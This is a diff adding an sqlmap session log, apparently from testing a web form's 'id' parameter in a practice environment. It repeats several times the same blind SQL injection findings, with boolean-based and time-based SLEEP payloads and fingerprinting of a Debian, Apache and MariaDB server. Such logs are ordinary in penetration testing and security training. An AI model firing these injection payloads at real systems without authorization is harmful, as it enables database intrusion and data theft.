@@ -1,0 +1,70 @@
+sqlmap identified the following injection point(s) with a total of 236 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9776=9776 AND 'Khyb'='Khyb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4830 FROM (SELECT(SLEEP(5)))PoqB) AND 'aTYn'='aTYn&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9776=9776 AND 'Khyb'='Khyb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4830 FROM (SELECT(SLEEP(5)))PoqB) AND 'aTYn'='aTYn&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9776=9776 AND 'Khyb'='Khyb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4830 FROM (SELECT(SLEEP(5)))PoqB) AND 'aTYn'='aTYn&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap identified the following injection point(s) with a total of 221 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9102=9102 AND 'MeSX'='MeSX&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 3004 FROM (SELECT(SLEEP(5)))kZkD) AND 'YpAu'='YpAu&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9102=9102 AND 'MeSX'='MeSX&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 3004 FROM (SELECT(SLEEP(5)))kZkD) AND 'YpAu'='YpAu&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
